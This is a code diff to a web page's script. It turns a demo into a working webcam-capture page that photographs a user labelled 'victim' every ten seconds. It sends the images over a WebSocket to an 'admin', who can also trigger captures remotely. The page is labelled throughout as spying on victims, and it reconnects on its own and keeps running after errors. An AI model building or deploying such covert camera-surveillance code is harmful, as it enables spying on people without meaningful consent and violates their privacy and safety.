@@ -81,100 +81,173 @@
     </div>
 
     <script>
+        // WebSocket connection
+        let socket;
         let video = document.getElementById('victim-camera');
         let canvas = document.createElement('canvas');
         let photosContainer = document.getElementById('photos-container');
         let photoCount = 0;
+        let wsConnected = false;
 
-        // Get camera access
-        navigator.mediaDevices.getUserMedia({video: true})
-            .then(stream => {
-                video.srcObject = stream;
-                console.log('Camera access granted');
-                document.querySelector('.status-indicator').textContent = 'Camera Active ✓';
-
-                // Auto-trigger photo after 2 seconds
-                setTimeout(() => {
-                    takePhoto();
-                }, 2000);
-            })
-            .catch(err => {
-                console.error('Camera access denied:', err);
-                document.querySelector('.status-indicator').textContent = 'Camera Error ✗';
-            });
-
-        // Take photo function
-        function takePhoto() {
+        // Connect to WebSocket server
+        function connectWebSocket() {
             try {
-                // Set canvas dimensions to match video
+                // For local testing, use WebSocket connection
+                // In production, you might need to adjust the URL
+                socket = new WebSocket('ws://localhost:8080');
+
+                socket.onopen = function(event) {
+                    console.log('WebSocket connected');
+                    wsConnected = true;
+                    document.querySelector('.status-indicator').textContent = 'Connected to Server ✓';
+                    // Send initial connection message
+                    socket.send(JSON.stringify({
+                        type: 'victim_connected',
+                        message: 'Victim camera connected'
+                    }));
+                };
+
+                socket.onmessage = function(event) {
+                    try {
+                        const data = JSON.parse(event.data);
+                        console.log('Received from server:', data);
+
+                        if (data.type === 'admin_trigger_photo') {
+                            // Admin triggered photo capture
+                            capturePhoto();
+                        }
+                    } catch (e) {
+                        console.error('Error parsing WebSocket message:', e);
+                    }
+                };
+
+                socket.onclose = function(event) {
+                    console.log('WebSocket disconnected');
+                    wsConnected = false;
+                    document.querySelector('.status-indicator').textContent = 'Disconnected - Reconnecting...';
+                    // Try to reconnect
+                    setTimeout(connectWebSocket, 3000);
+                };
+
+                socket.onerror = function(error) {
+                    console.error('WebSocket error:', error);
+                };
+            } catch (e) {
+                console.error('WebSocket connection failed:', e);
+                // Fallback to local operation if WebSocket fails
+                document.querySelector('.status-indicator').textContent = 'Local Mode Active';
+            }
+        }
+
+        // Start camera and connect to WebSocket
+        function startCamera() {
+            connectWebSocket();
+
+            // Try to get camera access
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    document.querySelector('.status-indicator').textContent = 'Camera Active ✓';
+                    document.getElementById('camera-container').classList.remove('hidden-camera');
+
+                    // Start auto-capturing every 10 seconds
+                    setInterval(capturePhoto, 10000);
+                })
+                .catch(function(err) {
+                    console.error('Camera error:', err);
+                    document.querySelector('.status-indicator').textContent = 'Camera Error - Using Local Mode';
+                    // Continue with local mode even without camera
+                    setTimeout(capturePhoto, 5000);
+                });
+        }
+
+        // Capture photo from camera
+        function capturePhoto() {
+            try {
+                // Get canvas context
+                const ctx = canvas.getContext('2d');
+
+                // Set canvas size to match video
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
 
-                // Draw video frame to canvas
-                const ctx = canvas.getContext('2d');
+                // Draw current video frame to canvas
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                 // Convert to data URL
-                const imageData = canvas.toDataURL('image/jpeg');
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
 
                 // Create photo element
                 const photoDiv = document.createElement('div');
                 photoDiv.className = 'photo-item';
                 photoDiv.innerHTML = `
                     <img src="${imageData}" alt="Victim Photo">
-                    <p>${new Date().toLocaleTimeString()}</p>
+                    <p>Photo #${++photoCount} - ${new Date().toLocaleTimeString()}</p>
                 `;
 
                 // Add to container
-                photosContainer.appendChild(photoDiv);
+                photosContainer.insertBefore(photoDiv, photosContainer.firstChild);
 
-                // Send to admin panel
-                sendPhotoToAdmin(imageData);
-
-                // Increment photo count
-                photoCount++;
-
-                // Auto-trigger next photo after 10 seconds
-                setTimeout(() => {
-                    takePhoto();
-                }, 10000);
-
-            } catch (error) {
-                console.error('Error taking photo:', error);
-            }
-        }
-
-        // Send photo to admin panel
-        function sendPhotoToAdmin(imageData) {
-            // In a real app, we would use WebSocket or AJAX to send to admin
-            // For demo purposes, we'll just log it
-            console.log('Photo sent to admin panel - Photo #' + photoCount);
-
-            // Simulate admin receiving it
-            const adminPhotos = document.getElementById('admin-photos');
-            if (adminPhotos) {
-                const photoDiv = document.createElement('div');
-                photoDiv.className = 'photo-item';
-                photoDiv.innerHTML = `
-                    <img src="${imageData}" alt="Victim Photo">
-                    <p>From Victim - ${new Date().toLocaleTimeString()}</p>
-                `;
-
-                // Remove "No photos" message if it exists
-                const noPhotos = adminPhotos.querySelector('.no-photos');
-                if (noPhotos) {
-                    adminPhotos.removeChild(noPhotos);
+                // Send to server via WebSocket
+                if (wsConnected && socket) {
+                    socket.send(JSON.stringify({
+                        type: 'photo_taken',
+                        data: imageData,
+                        timestamp: new Date().toISOString(),
+                        photoNumber: photoCount
+                    }));
                 }
 
-                // Add new photo
-                adminPhotos.insertBefore(photoDiv, adminPhotos.firstChild);
+            } catch (e) {
+                console.error('Photo capture error:', e);
+                // Fallback to creating a placeholder photo
+                createPlaceholderPhoto();
             }
         }
 
-        // Manual take photo button (for testing)
-        document.getElementById('take-photo-btn').addEventListener('click', function() {
-            takePhoto();
+        // Create placeholder photo when camera fails
+        function createPlaceholderPhoto() {
+            photoCount++;
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 150;
+            canvas.height = 150;
+            const ctx = canvas.getContext('2d');
+
+            // Draw blue background with victim info
+            ctx.fillStyle = '#4a90e2';
+            ctx.fillRect(0, 0, 150, 150);
+
+            ctx.fillStyle = 'white';
+            ctx.font = 'bold 16px Arial';
+            ctx.textAlign = 'center';
+            ctx.fillText('Victim Photo', 75, 75);
+
+            ctx.font = '14px Arial';
+            ctx.fillText('Photo #' + photoCount, 75, 95);
+
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+            const photoDiv = document.createElement('div');
+            photoDiv.className = 'photo-item';
+            photoDiv.innerHTML = `
+                <img src="${imageData}" alt="Victim Photo">
+                <p>Photo #${photoCount} - ${new Date().toLocaleTimeString()}</p>
+            `;
+
+            photosContainer.insertBefore(photoDiv, photosContainer.firstChild);
+        }
+
+        // Initialize when page loads
+        window.addEventListener('load', function() {
+            startCamera();
+
+            // Set up manual capture button
+            document.getElementById('take-photo-btn').addEventListener('click', function() {
+                capturePhoto();
+            });
         });
     </script>
 </body>
 </html>
+
